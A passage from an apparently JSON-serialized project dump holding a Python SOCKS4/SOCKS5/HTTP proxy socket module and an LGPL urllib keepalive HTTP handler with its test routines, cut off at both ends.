username=None, password=None):\n    \"\"\"setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])\n    Sets a default proxy which all further socksocket objects will use,\n    unless explicitly changed.\n    \"\"\"\n    global _defaultproxy\n    _defaultproxy = (proxytype, addr, port, rdns, username, password)\n\ndef wrapmodule(module):\n    \"\"\"wrapmodule(module)\n    Attempts to replace a module's socket library with a SOCKS socket. Must set\n    a default proxy using setdefaultproxy(...) first.\n    This will only work on modules that import socket directly into the namespace;\n    most of the Python Standard Library falls into this category.\n    \"\"\"\n    if _defaultproxy != None:\n        module.socket.socket = socksocket\n        if _defaultproxy[0] == PROXY_TYPE_SOCKS4:\n            # Note: unable to prevent DNS leakage in SOCKS4 (Reference: https://security.stackexchange.com/a/171280)\n            pass\n        else:\n            module.socket.create_connection = create_connection\n    else:\n        raise GeneralProxyError((4, \"no proxy specified\"))\n\ndef unwrapmodule(module):\n    module.socket.socket = _orgsocket\n    module.socket.create_connection = _orgcreateconnection\n\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET, type=SOCK_STREAM and proto=0.\n    \"\"\"\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):\n        _orgsocket.__init__(self, family, type, proto, _sock)\n        if _defaultproxy != None:\n            self.__proxy = _defaultproxy\n        else:\n            self.__proxy = (None, None, None, None, None, None)\n        self.__proxysockname = None\n        self.__proxypeername = None\n\n    def __recvall(self, count):\n        \"\"\"__recvall(count) -> data\n        Receive EXACTLY the number of bytes requested from the socket.\n        Blocks until the required number of bytes have been received.\n        \"\"\"\n        data = self.recv(count)\n        while len(data) < count:\n            d = self.recv(count-len(data))\n            if not d: raise GeneralProxyError((0, \"connection closed unexpectedly\"))\n            data = data + d\n        return data\n\n    def setproxy(self, proxytype=None, addr=None, port=None, rdns=True, username=None, password=None):\n        \"\"\"setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])\n        Sets the proxy to be used.\n        proxytype -    The type of the proxy to be used. Three types\n                are supported: PROXY_TYPE_SOCKS4 (including socks4a),\n                PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP\n        addr -        The address of the server (IP or DNS).\n        port -        The port of the server. Defaults to 1080 for SOCKS\n                servers and 8080 for HTTP proxy servers.\n        rdns -        Should DNS queries be preformed on the remote side\n                (rather than the local side). The default is True.\n                Note: This has no effect with SOCKS4 servers.\n        username -    Username to authenticate with to the server.\n                The default is no authentication.\n        password -    Password to authenticate with to the server.\n                Only relevant when username is also provided.\n        \"\"\"\n        self.__proxy = (proxytype, addr, port, rdns, username, password)\n\n    def __negotiatesocks5(self, destaddr, destport):\n        \"\"\"__negotiatesocks5(self,destaddr,destport)\n        Negotiates a connection through a SOCKS5 server.\n        \"\"\"\n        # First we'll send the authentication packages we support.\n        if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):\n            # The username/password details were supplied to the\n            # setproxy method so we support the USERNAME/PASSWORD\n            # authentication (in addition to the standard none).\n            self.sendall(struct.pack('BBBB', 0x05, 0x02, 0x00, 0x02))\n        else:\n            # No username/password were entered, therefore we\n            # only support connections with no authentication.\n            self.sendall(struct.pack('BBB', 0x05, 0x01, 0x00))\n        # We'll receive the server's response to determine which\n        # method was selected\n        chosenauth = self.__recvall(2)\n        if chosenauth[0:1] != chr(0x05).encode():\n            self.close()\n            raise GeneralProxyError((1, _generalerrors[1]))\n        # Check the chosen authentication method\n        if chosenauth[1:2] == chr(0x00).encode():\n            # No authentication is required\n            pass\n        elif chosenauth[1:2] == chr(0x02).encode():\n            # Okay, we need to perform a basic username/password\n            # authentication.\n            self.sendall(chr(0x01).encode() + chr(len(self.__proxy[4])).encode() + self.__proxy[4].encode() + chr(len(self.__proxy[5])).encode() + self.__proxy[5].encode())\n            authstat = self.__recvall(2)\n            if authstat[0:1] != chr(0x01).encode():\n                # Bad response\n                self.close()\n                raise GeneralProxyError((1, _generalerrors[1]))\n            if authstat[1:2] != chr(0x00).encode():\n                # Authentication failed\n                self.close()\n                raise Socks5AuthError((3, _socks5autherrors[3]))\n            # Authentication succeeded\n        else:\n            # Reaching here is always bad\n            self.close()\n            if chosenauth[1] == chr(0xFF).encode():\n                raise Socks5AuthError((2, _socks5autherrors[2]))\n            else:\n                raise GeneralProxyError((1, _generalerrors[1]))\n        # Now we can request the actual connection\n        req = struct.pack('BBB', 0x05, 0x01, 0x00)\n        # If the given destination address is an IP address, we'll\n        # use the IPv4 address request even if remote resolving was specified.\n        try:\n            ipaddr = socket.inet_aton(destaddr)\n            req = req + chr(0x01).encode() + ipaddr\n        except socket.error:\n            # Well it's not an IP number,  so it's probably a DNS name.\n            if self.__proxy[3]:\n                # Resolve remotely\n                ipaddr = None\n                req = req + chr(0x03).encode() + chr(len(destaddr)).encode() + (destaddr if isinstance(destaddr, bytes) else destaddr.encode())\n            else:\n                # Resolve locally\n                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))\n                req = req + chr(0x01).encode() + ipaddr\n        req = req + struct.pack(\">H\", destport)\n        self.sendall(req)\n        # Get the response\n        resp = self.__recvall(4)\n        if resp[0:1] != chr(0x05).encode():\n            self.close()\n            raise GeneralProxyError((1, _generalerrors[1]))\n        elif resp[1:2] != chr(0x00).encode():\n            # Connection failed\n            self.close()\n            if ord(resp[1:2])<=8:\n                raise Socks5Error((ord(resp[1:2]), _socks5errors[ord(resp[1:2])]))\n            else:\n                raise Socks5Error((9, _socks5errors[9]))\n        # Get the bound address/port\n        elif resp[3:4] == chr(0x01).encode():\n            boundaddr = self.__recvall(4)\n        elif resp[3:4] == chr(0x03).encode():\n            resp = resp + self.recv(1)\n            boundaddr = self.__recvall(ord(resp[4:5]))\n        else:\n            self.close()\n            raise GeneralProxyError((1,_generalerrors[1]))\n        boundport = struct.unpack(\">H\", self.__recvall(2))[0]\n        self.__proxysockname = (boundaddr, boundport)\n        if ipaddr != None:\n            self.__proxypeername = (socket.inet_ntoa(ipaddr), destport)\n        else:\n            self.__proxypeername = (destaddr, destport)\n\n    def getproxysockname(self):\n        \"\"\"getsockname() -> address info\n        Returns the bound IP address and port number at the proxy.\n        \"\"\"\n        return self.__proxysockname\n\n    def getproxypeername(self):\n        \"\"\"getproxypeername() -> address info\n        Returns the IP and port number of the proxy.\n        \"\"\"\n        return _orgsocket.getpeername(self)\n\n    def getpeername(self):\n        \"\"\"getpeername() -> address info\n        Returns the IP address and port number of the destination\n        machine (note: getproxypeername returns the proxy)\n        \"\"\"\n        return self.__proxypeername\n\n    def __negotiatesocks4(self,destaddr,destport):\n        \"\"\"__negotiatesocks4(self,destaddr,destport)\n        Negotiates a connection through a SOCKS4 server.\n        \"\"\"\n        # Check if the destination address provided is an IP address\n        rmtrslv = False\n        try:\n            ipaddr = socket.inet_aton(destaddr)\n        except socket.error:\n            # It's a DNS name. Check where it should be resolved.\n            if self.__proxy[3]:\n                ipaddr = struct.pack(\"BBBB\", 0x00, 0x00, 0x00, 0x01)\n                rmtrslv = True\n            else:\n                ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))\n        # Construct the request packet\n        req = struct.pack(\">BBH\", 0x04, 0x01, destport) + ipaddr\n        # The username parameter is considered userid for SOCKS4\n        if self.__proxy[4] != None:\n            req = req + self.__proxy[4]\n        req = req + chr(0x00).encode()\n        # DNS name if remote resolving is required\n        # NOTE: This is actually an extension to the SOCKS4 protocol\n        # called SOCKS4A and may not be supported in all cases.\n        if rmtrslv:\n            req = req + destaddr + chr(0x00).encode()\n        self.sendall(req)\n        # Get the response from the server\n        resp = self.__recvall(8)\n        if resp[0:1] != chr(0x00).encode():\n            # Bad data\n            self.close()\n            raise GeneralProxyError((1,_generalerrors[1]))\n        if resp[1:2] != chr(0x5A).encode():\n            # Server returned an error\n            self.close()\n            if ord(resp[1:2]) in (91, 92, 93):\n                self.close()\n                raise Socks4Error((ord(resp[1:2]), _socks4errors[ord(resp[1:2]) - 90]))\n            else:\n                raise Socks4Error((94, _socks4errors[4]))\n        # Get the bound address/port\n        self.__proxysockname = (socket.inet_ntoa(resp[4:]), struct.unpack(\">H\", resp[2:4])[0])\n        if rmtrslv != None:\n            self.__proxypeername = (socket.inet_ntoa(ipaddr), destport)\n        else:\n            self.__proxypeername = (destaddr, destport)\n\n    def __negotiatehttp(self, destaddr, destport):\n        \"\"\"__negotiatehttp(self,destaddr,destport)\n        Negotiates a connection through an HTTP server.\n        \"\"\"\n        # If we need to resolve locally, we do this now\n        if not self.__proxy[3]:\n            addr = socket.gethostbyname(destaddr)\n        else:\n            addr = destaddr\n        self.sendall((\"CONNECT \" + addr + \":\" + str(destport) + \" HTTP/1.1\\r\\n\" + \"Host: \" + destaddr + \"\\r\\n\\r\\n\").encode())\n        # We read the response until we get the string \"\\r\\n\\r\\n\"\n        resp = self.recv(1)\n        while resp.find(\"\\r\\n\\r\\n\".encode()) == -1:\n            resp = resp + self.recv(1)\n        # We just need the first line to check if the connection\n        # was successful\n        statusline = resp.splitlines()[0].split(\" \".encode(), 2)\n        if statusline[0] not in (\"HTTP/1.0\".encode(), \"HTTP/1.1\".encode()):\n            self.close()\n            raise GeneralProxyError((1, _generalerrors[1]))\n        try:\n            statuscode = int(statusline[1])\n        except ValueError:\n            self.close()\n            raise GeneralProxyError((1, _generalerrors[1]))\n        if statuscode != 200:\n            self.close()\n            raise HTTPError((statuscode, statusline[2]))\n        self.__proxysockname = (\"0.0.0.0\", 0)\n        self.__proxypeername = (addr, destport)\n\n    def connect(self, destpair):\n        \"\"\"connect(self, despair)\n        Connects to the specified destination through a proxy.\n        destpar - A tuple of the IP/DNS address and the port number.\n        (identical to socket's connect).\n        To select the proxy server use setproxy().\n        \"\"\"\n        # Do a minimal input check first\n        if (not type(destpair) in (list,tuple)) or (len(destpair) < 2) or (type(destpair[0]) != type('')) or (type(destpair[1]) != int):\n            raise GeneralProxyError((5, _generalerrors[5]))\n        if self.__proxy[0] == PROXY_TYPE_SOCKS5:\n            if self.__proxy[2] != None:\n                portnum = self.__proxy[2]\n            else:\n                portnum = 1080\n            _orgsocket.connect(self, (self.__proxy[1], portnum))\n            self.__negotiatesocks5(destpair[0], destpair[1])\n        elif self.__proxy[0] == PROXY_TYPE_SOCKS4:\n            if self.__proxy[2] != None:\n                portnum = self.__proxy[2]\n            else:\n                portnum = 1080\n            _orgsocket.connect(self,(self.__proxy[1], portnum))\n            self.__negotiatesocks4(destpair[0], destpair[1])\n        elif self.__proxy[0] == PROXY_TYPE_HTTP:\n            if self.__proxy[2] != None:\n                portnum = self.__proxy[2]\n            else:\n                portnum = 8080\n            _orgsocket.connect(self,(self.__proxy[1], portnum))\n            self.__negotiatehttp(destpair[0], destpair[1])\n        elif self.__proxy[0] == None:\n            _orgsocket.connect(self, (destpair[0], destpair[1]))\n        else:\n            raise GeneralProxyError((4, _generalerrors[4]))\n\ndef create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,\n                    source_address=None):\n    # Patched for a DNS-leakage\n    host, port = address\n    sock = None\n    try:\n        sock = socksocket(socket.AF_INET, socket.SOCK_STREAM)\n        if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:\n            sock.settimeout(timeout)\n        if source_address:\n            sock.bind(source_address)\n        sock.connect(address)\n    except socket.error:\n        if sock is not None:\n            sock.close()\n        raise\n    return sock\n", "thirdparty/socks/__init__.py": "", "thirdparty/keepalive/keepalive.py": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n#   This library is free software; you can redistribute it and/or\n#   modify it under the terms of the GNU Lesser General Public\n#   License as published by the Free Software Foundation; either\n#   version 2.1 of the License, or (at your option) any later version.\n#\n#   This library is distributed in the hope that it will be useful,\n#   but WITHOUT ANY WARRANTY; without even the implied warranty of\n#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n#   Lesser General Public License for more details.\n#\n#   You should have received a copy of the GNU Lesser General Public\n#   License along with this library; if not, write to the \n#      Free Software Foundation, Inc., \n#      59 Temple Place, Suite 330, \n#      Boston, MA  02111-1307  USA\n\n# This file was part of urlgrabber, a high-level cross-protocol url-grabber\n# Copyright 2002-2004 Michael D. Stenner, Ryan Tomayko\n# Copyright 2015 Sergio Fern\u00e1ndez\n\n\"\"\"An HTTP handler for urllib2 that supports HTTP 1.1 and keepalive.\n\n>>> import urllib2\n>>> from keepalive import HTTPHandler\n>>> keepalive_handler = HTTPHandler()\n>>> opener = _urllib.request.build_opener(keepalive_handler)\n>>> _urllib.request.install_opener(opener)\n>>> \n>>> fo = _urllib.request.urlopen('http://www.python.org')\n\nIf a connection to a given host is requested, and all of the existing\nconnections are still in use, another connection will be opened.  If\nthe handler tries to use an existing connection but it fails in some\nway, it will be closed and removed from the pool.\n\nTo remove the handler, simply re-run build_opener with no arguments, and\ninstall that opener.\n\nYou can explicitly close connections by using the close_connection()\nmethod of the returned file-like object (described below) or you can\nuse the handler methods:\n\n  close_connection(host)\n  close_all()\n  open_connections()\n\nNOTE: using the close_connection and close_all methods of the handler\nshould be done with care when using multiple threads.\n  * there is nothing that prevents another thread from creating new\n    connections immediately after connections are closed\n  * no checks are done to prevent in-use connections from being closed\n\n>>> keepalive_handler.close_all()\n\nEXTRA ATTRIBUTES AND METHODS\n\n  Upon a status of 200, the object returned has a few additional\n  attributes and methods, which should not be used if you want to\n  remain consistent with the normal urllib2-returned objects:\n\n    close_connection()  -  close the connection to the host\n    readlines()         -  you know, readlines()\n    status              -  the return status (ie 404)\n    reason              -  english translation of status (ie 'File not found')\n\n  If you want the best of both worlds, use this inside an\n  AttributeError-catching try:\n\n  >>> try: status = fo.status\n  >>> except AttributeError: status = None\n\n  Unfortunately, these are ONLY there if status == 200, so it's not\n  easy to distinguish between non-200 responses.  The reason is that\n  urllib2 tries to do clever things with error codes 301, 302, 401,\n  and 407, and it wraps the object upon return.\n\n  For python versions earlier than 2.4, you can avoid this fancy error\n  handling by setting the module-level global HANDLE_ERRORS to zero.\n  You see, prior to 2.4, it's the HTTP Handler's job to determine what\n  to handle specially, and what to just pass up.  HANDLE_ERRORS == 0\n  means \"pass everything up\".  In python 2.4, however, this job no\n  longer belongs to the HTTP Handler and is now done by a NEW handler,\n  HTTPErrorProcessor.  Here's the bottom line:\n\n    python version < 2.4\n        HANDLE_ERRORS == 1  (default) pass up 200, treat the rest as\n                            errors\n        HANDLE_ERRORS == 0  pass everything up, error processing is\n                            left to the calling code\n    python version >= 2.4\n        HANDLE_ERRORS == 1  pass up 200, treat the rest as errors\n        HANDLE_ERRORS == 0  (default) pass everything up, let the\n                            other handlers (specifically,\n                            HTTPErrorProcessor) decide what to do\n\n  In practice, setting the variable either way makes little difference\n  in python 2.4, so for the most consistent behavior across versions,\n  you probably just want to use the defaults, which will give you\n  exceptions on errors.\n\n\"\"\"\n\nfrom __future__ import print_function\n\ntry:\n    from thirdparty.six.moves import http_client as _http_client\n    from thirdparty.six.moves import range as _range\n    from thirdparty.six.moves import urllib as _urllib\nexcept ImportError:\n    from six.moves import http_client as _http_client\n    from six.moves import range as _range\n    from six.moves import urllib as _urllib\n\nimport socket\nimport threading\n\nDEBUG = None\n\nimport sys\nif sys.version_info < (2, 4): HANDLE_ERRORS = 1\nelse: HANDLE_ERRORS = 0\n\nclass ConnectionManager:\n    \"\"\"\n    The connection manager must be able to:\n      * keep track of all existing\n      \"\"\"\n    def __init__(self):\n        self._lock = threading.Lock()\n        self._hostmap = {} # map hosts to a list of connections\n        self._connmap = {} # map connections to host\n        self._readymap = {} # map connection to ready state\n\n    def add(self, host, connection, ready):\n        self._lock.acquire()\n        try:\n            if host not in self._hostmap: self._hostmap[host] = []\n            self._hostmap[host].append(connection)\n            self._connmap[connection] = host\n            self._readymap[connection] = ready\n        finally:\n            self._lock.release()\n\n    def remove(self, connection):\n        self._lock.acquire()\n        try:\n            try:\n                host = self._connmap[connection]\n            except KeyError:\n                pass\n            else:\n                del self._connmap[connection]\n                del self._readymap[connection]\n                self._hostmap[host].remove(connection)\n                if not self._hostmap[host]: del self._hostmap[host]\n        finally:\n            self._lock.release()\n\n    def set_ready(self, connection, ready):\n        try: self._readymap[connection] = ready\n        except KeyError: pass\n\n    def get_ready_conn(self, host):\n        conn = None\n        try:\n            self._lock.acquire()\n            if host in self._hostmap:\n                for c in self._hostmap[host]:\n                    if self._readymap.get(c):\n                        self._readymap[c] = 0\n                        conn = c\n                        break\n        finally:\n            self._lock.release()\n        return conn\n\n    def get_all(self, host=None):\n        if host:\n            return list(self._hostmap.get(host, []))\n        else:\n            return dict(self._hostmap)\n\nclass KeepAliveHandler:\n    def __init__(self):\n        self._cm = ConnectionManager()\n\n    #### Connection Management\n    def open_connections(self):\n        \"\"\"return a list of connected hosts and the number of connections\n        to each.  [('foo.com:80', 2), ('bar.org', 1)]\"\"\"\n        return [(host, len(li)) for (host, li) in self._cm.get_all().items()]\n\n    def close_connection(self, host):\n        \"\"\"close connection(s) to <host>\n        host is the host:port spec, as in 'www.cnn.com:8080' as passed in.\n        no error occurs if there is no connection to that host.\"\"\"\n        for h in self._cm.get_all(host):\n            self._cm.remove(h)\n            h.close()\n\n    def close_all(self):\n        \"\"\"close all open connections\"\"\"\n        for host, conns in self._cm.get_all().items():\n            for h in conns:\n                self._cm.remove(h)\n                h.close()\n\n    def _request_closed(self, request, host, connection):\n        \"\"\"tells us that this request is now closed and the the\n        connection is ready for another request\"\"\"\n        self._cm.set_ready(connection, 1)\n\n    def _remove_connection(self, host, connection, close=0):\n        if close: connection.close()\n        self._cm.remove(connection)\n\n    #### Transaction Execution\n    def do_open(self, req):\n        host = req.host\n        if not host:\n            raise _urllib.error.URLError('no host given')\n\n        try:\n            h = self._cm.get_ready_conn(host)\n            while h:\n                r = self._reuse_connection(h, req, host)\n\n                # if this response is non-None, then it worked and we're\n                # done.  Break out, skipping the else block.\n                if r: break\n\n                # connection is bad - possibly closed by server\n                # discard it and ask for the next free connection\n                h.close()\n                self._cm.remove(h)\n                h = self._cm.get_ready_conn(host)\n            else:\n                # no (working) free connections were found.  Create a new one.\n                h = self._get_connection(host)\n                if DEBUG: DEBUG.info(\"creating new connection to %s (%d)\",\n                                     host, id(h))\n                self._cm.add(host, h, 0)\n                self._start_transaction(h, req)\n                r = h.getresponse()\n        except (socket.error, _http_client.HTTPException) as err:\n            raise _urllib.error.URLError(err)\n\n        if DEBUG: DEBUG.info(\"STATUS: %s, %s\", r.status, r.reason)\n\n        # if not a persistent connection, don't try to reuse it\n        if r.will_close:\n            if DEBUG: DEBUG.info('server will close connection, discarding')\n            self._cm.remove(h)\n\n        r._handler = self\n        r._host = host\n        r._url = req.get_full_url()\n        r._connection = h\n        r.code = r.status\n        r.headers = r.msg\n        r.msg = r.reason\n\n        if r.status == 200 or not HANDLE_ERRORS:\n            return r\n        else:\n            return self.parent.error('http', req, r,\n                                     r.status, r.msg, r.headers)\n\n    def _reuse_connection(self, h, req, host):\n        \"\"\"start the transaction with a re-used connection\n        return a response object (r) upon success or None on failure.\n        This DOES not close or remove bad connections in cases where\n        it returns.  However, if an unexpected exception occurs, it\n        will close and remove the connection before re-raising.\n        \"\"\"\n        try:\n            self._start_transaction(h, req)\n            r = h.getresponse()\n            # note: just because we got something back doesn't mean it\n            # worked.  We'll check the version below, too.\n        except (socket.error, _http_client.HTTPException):\n            r = None\n        except:\n            # adding this block just in case we've missed\n            # something we will still raise the exception, but\n            # lets try and close the connection and remove it\n            # first.  We previously got into a nasty loop\n            # where an exception was uncaught, and so the\n            # connection stayed open.  On the next try, the\n            # same exception was raised, etc.  The tradeoff is\n            # that it's now possible this call will raise\n            # a DIFFERENT exception\n            if DEBUG: DEBUG.error(\"unexpected exception - closing \" + \\\n                                  \"connection to %s (%d)\", host, id(h))\n            self._cm.remove(h)\n            h.close()\n            raise\n\n        if r is None or r.version == 9:\n            # httplib falls back to assuming HTTP 0.9 if it gets a\n            # bad header back.  This is most likely to happen if\n            # the socket has been closed by the server since we\n            # last used the connection.\n            if DEBUG: DEBUG.info(\"failed to re-use connection to %s (%d)\",\n                                 host, id(h))\n            r = None\n        else:\n            if DEBUG: DEBUG.info(\"re-using connection to %s (%d)\", host, id(h))\n\n        return r\n\n    def _start_transaction(self, h, req):\n        try:\n            if req.data:\n                data = req.data\n                if hasattr(req, 'selector'):\n                    h.putrequest(req.get_method() or 'POST', req.selector, skip_host=req.has_header(\"Host\"), skip_accept_encoding=req.has_header(\"Accept-encoding\"))\n                else:\n                    h.putrequest(req.get_method() or 'POST', req.get_selector(), skip_host=req.has_header(\"Host\"), skip_accept_encoding=req.has_header(\"Accept-encoding\"))\n                if 'Content-type' not in req.headers:\n                    h.putheader('Content-type',\n                                'application/x-www-form-urlencoded')\n                if 'Content-length' not in req.headers:\n                    h.putheader('Content-length', '%d' % len(data))\n            else:\n                if hasattr(req, 'selector'):\n                    h.putrequest(req.get_method() or 'GET', req.selector, skip_host=req.has_header(\"Host\"), skip_accept_encoding=req.has_header(\"Accept-encoding\"))\n                else:\n                    h.putrequest(req.get_method() or 'GET', req.get_selector(), skip_host=req.has_header(\"Host\"), skip_accept_encoding=req.has_header(\"Accept-encoding\"))\n        except (socket.error, _http_client.HTTPException) as err:\n            raise _urllib.error.URLError(err)\n\n        if 'Connection' not in req.headers:\n            req.headers['Connection'] = 'keep-alive'\n\n        for args in self.parent.addheaders:\n            if args[0] not in req.headers:\n                h.putheader(*args)\n        for k, v in req.headers.items():\n            h.putheader(k, v)\n        h.endheaders()\n        if req.data:\n            h.send(data)\n\n    def _get_connection(self, host):\n        return NotImplementedError\n\nclass HTTPHandler(KeepAliveHandler, _urllib.request.HTTPHandler):\n    def __init__(self):\n        KeepAliveHandler.__init__(self)\n\n    def http_open(self, req):\n        return self.do_open(req)\n\n    def _get_connection(self, host):\n        return HTTPConnection(host)\n\nclass HTTPSHandler(KeepAliveHandler, _urllib.request.HTTPSHandler):\n    def __init__(self, ssl_factory=None):\n        KeepAliveHandler.__init__(self)\n        if not ssl_factory:\n            try:\n                import sslfactory\n                ssl_factory = sslfactory.get_factory()\n            except ImportError:\n                pass\n        self._ssl_factory = ssl_factory\n\n    def https_open(self, req):\n        return self.do_open(req)\n\n    def _get_connection(self, host):\n        try: return self._ssl_factory.get_https_connection(host)\n        except AttributeError: return HTTPSConnection(host)\n\nclass HTTPResponse(_http_client.HTTPResponse):\n    # we need to subclass HTTPResponse in order to\n    # 1) add readline() and readlines() methods\n    # 2) add close_connection() methods\n    # 3) add info() and geturl() methods\n\n    # in order to add readline(), read must be modified to deal with a\n    # buffer.  example: readline must read a buffer and then spit back\n    # one line at a time.  The only real alternative is to read one\n    # BYTE at a time (ick).  Once something has been read, it can't be\n    # put back (ok, maybe it can, but that's even uglier than this),\n    # so if you THEN do a normal read, you must first take stuff from\n    # the buffer.\n\n    # the read method wraps the original to accomodate buffering,\n    # although read() never adds to the buffer.\n    # Both readline and readlines have been stolen with almost no\n    # modification from socket.py\n\n\n    def __init__(self, sock, debuglevel=0, strict=0, method=None):\n        if method: # the httplib in python 2.3 uses the method arg\n            _http_client.HTTPResponse.__init__(self, sock, debuglevel, method)\n        else: # 2.2 doesn't\n            _http_client.HTTPResponse.__init__(self, sock, debuglevel)\n        self.fileno = sock.fileno\n        self.code = None\n        self._method = method\n        self._rbuf = b\"\"\n        self._rbufsize = 8096\n        self._handler = None # inserted by the handler later\n        self._host = None    # (same)\n        self._url = None     # (same)\n        self._connection = None # (same)\n\n    _raw_read = _http_client.HTTPResponse.read\n\n    def close(self):\n        if self.fp:\n            self.fp.close()\n            self.fp = None\n            if self._handler:\n                self._handler._request_closed(self, self._host,\n                                              self._connection)\n\n    # Note: Patch for Python3 (otherwise, connections won't be reusable)\n    def _close_conn(self):\n        self.close()\n\n    def close_connection(self):\n        self._handler._remove_connection(self._host, self._connection, close=1)\n        self.close()\n\n    def info(self):\n        return self.headers\n\n    def geturl(self):\n        return self._url\n\n    def read(self, amt=None):\n        # the _rbuf test is only in this first if for speed.  It's not\n        # logically necessary\n        if self._rbuf and not amt is None:\n            L = len(self._rbuf)\n            if amt > L:\n                amt -= L\n            else:\n                s = self._rbuf[:amt]\n                self._rbuf = self._rbuf[amt:]\n                return s\n\n        s = self._rbuf + self._raw_read(amt)\n        self._rbuf = b\"\"\n        return s\n\n    def readline(self, limit=-1):\n        data = b\"\"\n        i = self._rbuf.find('\\n')\n        while i < 0 and not (0 < limit <= len(self._rbuf)):\n            new = self._raw_read(self._rbufsize)\n            if not new: break\n            i = new.find('\\n')\n            if i >= 0: i = i + len(self._rbuf)\n            self._rbuf = self._rbuf + new\n        if i < 0: i = len(self._rbuf)\n        else: i = i+1\n        if 0 <= limit < len(self._rbuf): i = limit\n        data, self._rbuf = self._rbuf[:i], self._rbuf[i:]\n        return data\n\n    def readlines(self, sizehint = 0):\n        total = 0\n        list = []\n        while 1:\n            line = self.readline()\n            if not line: break\n            list.append(line)\n            total += len(line)\n            if sizehint and total >= sizehint:\n                break\n        return list\n\n\nclass HTTPConnection(_http_client.HTTPConnection):\n    # use the modified response class\n    response_class = HTTPResponse\n\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    response_class = HTTPResponse\n\n#########################################################################\n#####   TEST FUNCTIONS\n#########################################################################\n\ndef error_handler(url):\n    global HANDLE_ERRORS\n    orig = HANDLE_ERRORS\n    keepalive_handler = HTTPHandler()\n    opener = _urllib.request.build_opener(keepalive_handler)\n    _urllib.request.install_opener(opener)\n    pos = {0: 'off', 1: 'on'}\n    for i in (0, 1):\n        print(\"  fancy error handling %s (HANDLE_ERRORS = %i)\" % (pos[i], i))\n        HANDLE_ERRORS = i\n        try:\n            fo = _urllib.request.urlopen(url)\n            foo = fo.read()\n            fo.close()\n            try: status, reason = fo.status, fo.reason\n            except AttributeError: status, reason = None, None\n        except IOError as e:\n            print(\"  EXCEPTION: %s\" % e)\n            raise\n        else:\n            print(\"  status = %s, reason = %s\" % (status, reason))\n    HANDLE_ERRORS = orig\n    hosts = keepalive_handler.open_connections()\n    print(\"open connections:\", hosts)\n    keepalive_handler.close_all()\n\ndef continuity(url):\n    from hashlib import md5\n    format = '%25s: %s'\n\n    # first fetch the file with the normal http handler\n    opener = _urllib.request.build_opener()\n    _urllib.request.install_opener(opener)\n    fo = _urllib.request.urlopen(url)\n    foo = fo.read()\n    fo.close()\n    m = md5(foo)\n    print(format % ('normal urllib', m.hexdigest()))\n\n    # now install the keepalive handler and try again\n    opener = _urllib.request.build_opener(HTTPHandler())\n    _urllib.request.install_opener(opener)\n\n    fo = _urllib.request.urlopen(url)\n    foo = fo.read()\n    fo.close()\n    m = md5(foo)\n    print(format % ('keepalive read', m.hexdigest()))\n\n    fo = _urllib.request.urlopen(url)\n    foo = ''\n    while 1:\n        f = fo.readline()\n        if f: foo = foo + f\n        else: break\n    fo.close()\n    m = md5(foo)\n    print(format % ('keepalive readline', m.hexdigest()))\n\ndef comp(N, url):\n    print('  making %i connections to:\\n  %s' % (N, url))\n\n    sys.stdout.write('  first using the normal urllib handlers')\n    # first use normal opener\n    opener = _urllib.request.build_opener()\n    _urllib.request.install_opener(opener)\n    t1 = fetch(N, url)\n    print('  TIME: %.3f s' % t1)\n\n    sys.stdout.write('  now using the keepalive handler       ')\n    # now install the keepalive handler and try again\n    opener = _urllib.request.build_opener(HTTPHandler())\n    _urllib.request.install_opener(opener)\n    t2 = fetch(N, url)\n    print('  TIME: %.3f s' % t2)\n    print('  improvement factor: %.2f' % (t1/t2, ))\n\ndef fetch(N, url, delay=0):\n    import time\n    lens = []\n    starttime = time.time()\n    for i in _range(N):\n        if delay and i > 0: time.sleep(delay)\n        fo = _urllib.request.urlopen(url)\n        foo = fo.read()\n        fo.close()\n        lens.append(len(foo))\n    diff = time.time() - starttime\n\n    j = 0\n    for i in lens[1:]:\n        j = j + 1\n        if not i == lens[0]:\n            print(\"WARNING: inconsistent length on read %i: %i\" % (j, i))\n\n    return diff\n\ndef test_timeout(url):\n    global DEBUG\n    dbbackup = DEBUG\n    class FakeLogger:\n        def debug(self, msg, *args): print(msg % args)\n        info = warning = error = debug\n    DEBUG = FakeLogger()\n    print(\"  fetching the file to establish a connection\")\n    fo = _urllib.request.urlopen(url)\n    data1 = fo.read()\n    fo.close()\n\n    i = 20\n    print(\"  waiting %i seconds for the server to close the connection\" % i)\n    while i > 0:\n        sys.stdout.write('\\r  %2i' % i)\n        sys.stdout.flush()\n        time.sleep(1)\n        i -= 1\n    sys.stderr.write('\\r')\n\n    print(\"  fetching the file a second time\")\n    fo = _urllib.request.urlopen(url)\n    data2 = fo.read()\n    fo.close()\n\n    if data1 == data2:\n        print('  data are identical')\n    else:\n        print('  ERROR: DATA DIFFER')\n\n    DEBUG = dbbackup\n\n\ndef test(url, N=10):\n    print(\"checking error hander (do this on a non-200)\")\n    try: error_handler(url)\n    except IOError as e:\n        print(\"exiting - exception will prevent further tests\")\n        sys.exit()\n    print()\n    print(\"performing continuity test (making sure stuff isn't corrupted)\")\n    continuity(url)\n    print()\n    print(\"performing speed comparison\")\n    comp(N, url)\n    print()\n    print(\"performing dropped-connection check\")\n    test_timeout(url)\n\nif __name__ == '__main__':\n    import time\n    import sys\n    try:\n        N = int(sys.argv[1])\n        url = sys.argv[2]\n    except:\n        print(\"%s <integer> <url>\" % sys.argv[0])\n    else:\n        test(url, N)\n", "thirdparty/keepalive/__init__.py": "#!/usr/bin/env python\n#\n# Copyright 2002-2003 Michael D. Stenner\n#\n# This program is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Lesser General Public License as published\n# by the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in 